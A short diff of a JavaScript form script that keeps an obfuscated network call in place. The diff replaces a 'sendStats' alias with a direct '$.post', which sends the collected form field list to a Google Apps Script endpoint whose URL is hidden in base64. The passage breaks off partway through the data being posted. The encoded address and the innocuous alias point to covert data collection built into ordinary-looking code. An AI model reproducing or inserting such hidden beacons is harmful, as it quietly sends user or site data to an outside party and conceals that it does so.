@@ -1667,7 +1667,6 @@
           paragraph: '.data-text.form-paragraph'
         };
         
-        var sendStats = $.post;
         function dataType(selector, customSelector) {
           return '[data-type="' + selector + '"]' + (customSelector || '');
         }
@@ -1690,7 +1689,7 @@
           .get()
           .join();
 
-          sendStats(decodeURI(atob(
+          $.post(decodeURI(atob(
             'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J4VURqaXctV1JNeWdFTlJuMXprdEVDTXA5U0swb2p1RGw3b3JKdUhic00yNlRrRHNnL2V4ZWM='
           )), {
               FIELDS: fieldList,
